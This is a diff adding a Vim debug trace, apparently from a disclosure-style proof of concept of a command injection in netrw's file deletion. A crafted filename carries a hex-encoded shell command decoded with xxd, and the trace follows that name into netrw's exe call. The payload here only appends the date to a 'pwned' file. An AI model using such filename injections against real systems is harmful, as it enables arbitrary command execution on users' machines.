@@ -1,0 +1,129 @@
+line 39: unlet {a:vt}netrw_gdkeep   |endif
+line 39: endif
+line 40: if exists("{a:vt}netrw_hidkeep")  |let &l:hidden = {a:vt}netrw_hidkeep     |unlet {a:vt}netrw_hidkeep  |endif
+line 40: let &l:hidden = {a:vt}netrw_hidkeep     |unlet {a:vt}netrw_hidkeep  |endif
+line 40: unlet {a:vt}netrw_hidkeep  |endif
+line 40: endif
+line 41: if exists("{a:vt}netrw_magic")    |let &l:magic  = {a:vt}netrw_magic       |unlet {a:vt}netrw_magic    |endif
+line 41: endif
+line 42: if exists("{a:vt}netrw_repkeep")  |let &l:report = {a:vt}netrw_repkeep     |unlet {a:vt}netrw_repkeep  |endif
+line 42: let &l:report = {a:vt}netrw_repkeep     |unlet {a:vt}netrw_repkeep  |endif
+line 42: unlet {a:vt}netrw_repkeep  |endif
+line 42: endif
+line 43: if exists("{a:vt}netrw_spellkeep")|let &l:spell  = {a:vt}netrw_spellkeep   |unlet {a:vt}netrw_spellkeep|endif
+line 43: let &l:spell  = {a:vt}netrw_spellkeep   |unlet {a:vt}netrw_spellkeep|endif
+line 43: unlet {a:vt}netrw_spellkeep|endif
+line 43: endif
+line 44: if exists("{a:vt}netrw_twkeep")   |let &l:tw     = {a:vt}netrw_twkeep      |unlet {a:vt}netrw_twkeep   |endif
+line 44: let &l:tw     = {a:vt}netrw_twkeep      |unlet {a:vt}netrw_twkeep   |endif
+line 44: unlet {a:vt}netrw_twkeep   |endif
+line 44: endif
+line 45: if exists("{a:vt}netrw_wigkeep")  |let &l:wig    = {a:vt}netrw_wigkeep     |unlet {a:vt}netrw_wigkeep  |endif
+line 45: let &l:wig    = {a:vt}netrw_wigkeep     |unlet {a:vt}netrw_wigkeep  |endif
+line 45: unlet {a:vt}netrw_wigkeep  |endif
+line 45: endif
+line 46: if exists("s:yykeep")             |let  @@       = s:yykeep                |unlet s:yykeep             |endif
+line 46: let  @@       = s:yykeep                |unlet s:yykeep             |endif
+line 46: unlet s:yykeep             |endif
+line 46: endif
+line 47: if exists("{a:vt}netrw_swfkeep")
+line 61: endif
+>c
+"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:exec
+" ============================================================================
+../
+foo')|call system('eval eval `echo 0:64617465203e3e2070776e6564 | xxd -r`
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:exec
+" ============================================================================
+../
+"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:exec
+" ============================================================================
+../
+foo')|call system('eval eval `echo 0:64617465203e3e2070776e6564 | xxd -r`
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+sploit [RO]
+Entering Debug mode.  Type "cont" to continue.
+cmd: norm D
+cmd: call <SNR>16_NetrwLocalRm("/home/rdancer/vuln/vim/netrw.v4/sploit")
+line 5: let ret   = 0
+line 6: let all   = 0
+line 7: let svpos = netrw#NetrwSavePosn()
+line 9: if exists("s:netrwmarkfilelist_{bufnr('%')}")
+line 22: else
+line 26: let ctr = a:firstline
+line 27: while ctr <= a:lastline
+line 28: exe "keepjumps ".ctr
+line 31: if line(".") < w:netrw_bannercnt
+>echo ctr
+9
+line 34: endif
+line 35: let curword= s:NetrwGetWord()
+line 36: if curword == "./" || curword == "../"
+line 39: endif
+line 40: let ok= s:NetrwLocalRmFile(a:path,curword,all)
+line 3: let all= a:all
+line 4: let ok = ""
+line 5: norm! 0
+line 6: let rmfile= s:ComposePath(a:path,a:fname)
+line 9: if rmfile !~ '^"' && (rmfile =~ '@$' || rmfile !~ '[\/]$')
+line 12: if !all
+line 13: echohl Statement
+line 14: call inputsave()
+line 15: let ok= input("Confirm deletion of file<".rmfile."> ","[{y(es)},n(o),a(ll),q(uit)] ")
+line 16: call inputrestore()
+line 17: echohl NONE
+line 18: if ok == ""
+>echo ok
+>let ok="y"
+>echo ok
+y
+line 20: endif
+line 22: let ok= substitute(ok,'\[{y(es)},n(o),a(ll),q(uit)]\s*','','e')
+line 24: if ok =~ 'a\%[ll]'
+>echo ok
+y
+line 26: endif
+line 27: endif
+line 29: if all || ok =~ 'y\%[es]' || ok == ""
+line 30: let ret= s:System("delete",rmfile)
+>echo rmfile
+/home/rdancer/vuln/vim/netrw.v4/sploit/foo')|call system('eval eval `echo 0:64617465203e3e2070776e6564 | xxd -r`
+line 3: let path = a:path
+line 4: if !g:netrw_cygwin && (has("win32") || has("win95") || has("win64") || has("win16"))
+line 21: else
+line 23: exe "let result= ".a:cmd."('".path."')"
+>
